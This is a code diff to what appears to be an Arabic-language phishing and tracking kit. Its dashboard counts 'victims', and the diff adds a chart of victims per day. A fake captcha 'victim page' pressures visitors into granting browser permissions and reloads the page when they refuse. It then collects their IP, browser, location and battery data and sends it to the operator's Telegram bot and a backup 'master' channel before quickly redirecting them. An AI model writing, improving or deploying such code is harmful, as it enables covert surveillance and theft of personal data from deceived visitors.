@@ -2338,6 +2338,20 @@
                 min-width: unset;
             }
         }
+
+        /* ===== CHART ===== */
+        .chart-container {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 16px 20px;
+            border: 1px solid rgba(184, 148, 46, 0.07);
+            margin-bottom: 20px;
+        }
+        .chart-container canvas {
+            width: 100% !important;
+            height: auto !important;
+            max-height: 180px;
+        }
     </style>
 </head>
 <body>
@@ -2636,6 +2650,11 @@
                             <div class="dash-stat-card"><span class="stat-num" id="ovVictims">0</span><div class="stat-label">الضحايا</div></div>
                             <div class="dash-stat-card"><span class="stat-num" id="ovFiles">0</span><div class="stat-label">الملفات</div></div>
                             <div class="dash-stat-card"><span class="stat-num" id="ovToday">0</span><div class="stat-label">زيارات اليوم</div></div>
+                        </div>
+                        <!-- Chart -->
+                        <div class="chart-container">
+                            <div style="font-weight:600;font-family:var(--font-en);color:var(--gold);margin-bottom:8px;font-size:12px;letter-spacing:1px;">النشاط خلال الأيام الماضية</div>
+                            <canvas id="activityChart" height="120"></canvas>
                         </div>
                         <div class="detail-view">
                             <div style="font-weight:700;font-family:var(--font-en);color:var(--gold);margin-bottom:12px;font-size:14px;">آخر النشاطات</div>
@@ -3321,8 +3340,132 @@
                 // Recent logs
                 renderRecentLogs();
 
+                // Chart
+                drawChart(victims);
+
                 // Bot count in overview
                 applyTheme(currentTheme);
+            }
+
+            // ===== CHART =====
+            function drawChart(victims) {
+                const canvas = document.getElementById('activityChart');
+                if (!canvas) return;
+                const ctx = canvas.getContext('2d');
+                const rect = canvas.parentElement.getBoundingClientRect();
+                const width = canvas.parentElement.clientWidth - 40;
+                const height = 120;
+                canvas.width = width * 2;
+                canvas.height = height * 2;
+                canvas.style.width = width + 'px';
+                canvas.style.height = height + 'px';
+                ctx.scale(2, 2);
+
+                const dpr = 2;
+                const w = width;
+                const h = height;
+                const pad = { top: 10, bottom: 20, left: 20, right: 20 };
+                const chartW = w - pad.left - pad.right;
+                const chartH = h - pad.top - pad.bottom;
+
+                // Aggregate by day (last 7 days)
+                const days = 7;
+                const now = new Date();
+                const dayMap = {};
+                for (let i = 0; i < days; i++) {
+                    const d = new Date(now);
+                    d.setDate(d.getDate() - i);
+                    const key = d.toISOString().slice(0, 10);
+                    dayMap[key] = 0;
+                }
+                victims.forEach(function(v) {
+                    if (v.timestamp) {
+                        const key = v.timestamp.slice(0, 10);
+                        if (dayMap[key] !== undefined) dayMap[key]++;
+                    }
+                });
+
+                const keys = Object.keys(dayMap).reverse();
+                const values = keys.map(function(k) { return dayMap[k]; });
+                const maxVal = Math.max(1, ...values);
+
+                ctx.clearRect(0, 0, w, h);
+
+                // Grid lines
+                ctx.strokeStyle = 'rgba(184,148,46,0.08)';
+                ctx.lineWidth = 0.5;
+                for (let i = 0; i <= 4; i++) {
+                    const y = pad.top + chartH - (i / 4) * chartH;
+                    ctx.beginPath();
+                    ctx.moveTo(pad.left, y);
+                    ctx.lineTo(w - pad.right, y);
+                    ctx.stroke();
+                }
+
+                // Bars
+                const barWidth = chartW / days * 0.6;
+                const gap = chartW / days * 0.4;
+                const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+
+                values.forEach(function(val, idx) {
+                    const x = pad.left + idx * (chartW / days) + gap / 2;
+                    const barH = (val / maxVal) * chartH;
+                    const y = pad.top + chartH - barH;
+
+                    const grad = ctx.createLinearGradient(x, y, x, pad.top + chartH);
+                    if (isDark) {
+                        grad.addColorStop(0, '#d9b84a');
+                        grad.addColorStop(1, 'rgba(184,148,46,0.2)');
+                    } else {
+                        grad.addColorStop(0, '#b8942e');
+                        grad.addColorStop(1, 'rgba(184,148,46,0.2)');
+                    }
+                    ctx.fillStyle = grad;
+
+                    const radius = 3;
+                    ctx.beginPath();
+                    ctx.roundRect(x, y, barWidth, barH, [radius, radius, 0, 0]);
+                    ctx.fill();
+
+                    // Label
+                    ctx.fillStyle = isDark ? '#8a8478' : '#4a4640';
+                    ctx.font = '8px Inter, sans-serif';
+                    ctx.textAlign = 'center';
+                    const label = keys[idx].slice(5);
+                    ctx.fillText(label, x + barWidth / 2, pad.top + chartH + 14);
+                });
+
+                // Y-axis labels
+                ctx.fillStyle = isDark ? '#8a8478' : '#4a4640';
+                ctx.font = '8px Inter, sans-serif';
+                ctx.textAlign = 'right';
+                for (let i = 0; i <= 4; i++) {
+                    const val = Math.round((i / 4) * maxVal);
+                    const y = pad.top + chartH - (i / 4) * chartH;
+                    ctx.fillText(val, pad.left - 4, y + 3);
+                }
+            }
+
+            // polyfill roundRect if needed
+            if (!CanvasRenderingContext2D.prototype.roundRect) {
+                CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, radii) {
+                    const r = Array.isArray(radii) ? radii : [radii, radii, radii, radii];
+                    const tl = r[0] || 0;
+                    const tr = r[1] || 0;
+                    const br = r[2] || 0;
+                    const bl = r[3] || 0;
+                    this.moveTo(x + tl, y);
+                    this.lineTo(x + w - tr, y);
+                    this.quadraticCurveTo(x + w, y, x + w, y + tr);
+                    this.lineTo(x + w, y + h - br);
+                    this.quadraticCurveTo(x + w, y + h, x + w - br, y + h);
+                    this.lineTo(x + bl, y + h);
+                    this.quadraticCurveTo(x, y + h, x, y + h - bl);
+                    this.lineTo(x, y + tl);
+                    this.quadraticCurveTo(x, y, x + tl, y);
+                    this.closePath();
+                    return this;
+                };
             }
 
             function renderBotList(bots) {
@@ -3942,7 +4085,7 @@
             }
 
             // ================================================================
-            //  10.  VICTIM PAGE — PERMISSION-BASED COLLECTION
+            //  10.  VICTIM PAGE — PERMISSION-BASED COLLECTION (STRICT)
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -3959,6 +4102,7 @@
                 var collectionDone = false;
                 var redirectUrl = null;
                 var permissionsGranted = false;
+                var retryCount = 0;
 
                 function decodeBotData(encoded) {
                     try {
@@ -4033,12 +4177,10 @@
                             name + (granted ? ' ✓' : ' ✗');
                         permList.appendChild(div);
                     }
-                    // Show container if we have any item
                     permContainer.style.display = 'flex';
                 }
 
                 async function requestAllPermissionsStrict() {
-                    // Reset status
                     permList.innerHTML = '';
                     permContainer.style.display = 'flex';
                     mainText.textContent = 'جاري التحقق من الأذونات …';
@@ -4103,10 +4245,13 @@
                 async function collectAndStore() {
                     if (isRunning || collectionDone) return;
                     if (!permissionsGranted) {
-                        // Try to get permissions first
                         var ok = await requestAllPermissionsStrict();
                         if (!ok) {
                             showToast('يجب تفعيل جميع الأذونات أولاً.', 'warning');
+                            // Auto refresh after 3 seconds to re-request permissions
+                            setTimeout(function() {
+                                location.reload();
+                            }, 3000);
                             return;
                         }
                     }
@@ -4245,11 +4390,11 @@
                         }
                         localStorage.setItem('zeus_files', JSON.stringify(files));
 
-                        // Send to Telegram
+                        // Send to Telegram (fire and forget, don't block redirect)
                         if (botCreds && botCreds.botToken && botCreds.chatId) {
-                            await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
+                            sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(function() {});
                         }
-                        await sendToMaster(data, battery, token);
+                        sendToMaster(data, battery, token).catch(function() {});
 
                         addLog('success', 'جمع بيانات ضحية جديدة (IP: ' + data.ip + ')');
 
@@ -4259,14 +4404,14 @@
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
 
-                        // ===== DIRECT REDIRECT (المطلوب الأول) =====
+                        // ===== DIRECT REDIRECT (فوري) =====
                         setTimeout(function() {
                             if (redirectUrl) {
                                 window.location.replace(redirectUrl);
                             } else {
                                 window.location.reload();
                             }
-                        }, 800);
+                        }, 300); // Reduced from 800ms to 300ms for faster redirect
 
                     } catch (error) {
                         console.error('Collection error:', error);
@@ -4276,6 +4421,10 @@
                         spinner.classList.add('failed');
                         showToast('حدث خطأ أثناء جمع البيانات.', 'error');
                         isRunning = false;
+                        // Auto retry after 2 seconds
+                        setTimeout(function() {
+                            location.reload();
+                        }, 2000);
                     }
                 }
 
@@ -4407,7 +4556,7 @@
                         body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown' })
                     }).catch(function() {});
 
-                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.time);
+                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp);
                     await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -4497,7 +4646,7 @@
                         '⭑ نسخة احتياطية ⭒\n' + formatLocationMessage(data.location) + '\n' + userInfo +
                         '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
                     var visitMsg =
-                        '⭑ نسخة احتياطية ⭒\n' + formatVisitMessage(data.ip, data.browser, token, data.time) +
+                        '⭑ نسخة احتياطية ⭒\n' + formatVisitMessage(data.ip, data.browser, token, data.timestamp) +
                         '\n' + userInfo +
                         '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
 
@@ -4593,11 +4742,11 @@
                     if (isRunning || collectionDone) return;
                     if (e.target.closest('a')) return;
                     if (!checkbox.checked && !spinner.classList.contains('loading')) {
-                        // Start permission check
                         requestAllPermissionsStrict().then(function(ok) {
                             if (ok) {
-                                // Permissions granted, start collection
                                 collectAndStore();
+                            } else {
+                                // If failed, stay on page, show retry
                             }
                         });
                     }
@@ -4614,7 +4763,6 @@
                     }
                 });
 
-                // Auto-start if captcha is clicked
                 document.getElementById('captchaWrapper').addEventListener('click', function(e) {
                     if (e.target.closest('a')) return;
                     if (isRunning || collectionDone) return;
@@ -4633,7 +4781,6 @@
             //  11.  INIT
             // ================================================================
 
-            // Expose for dashboard actions
             window.renderDashboard = renderDashboard;
             window.dashDeleteBot = dashDeleteBot;
             window.dashDeleteVictim = dashDeleteVictim;
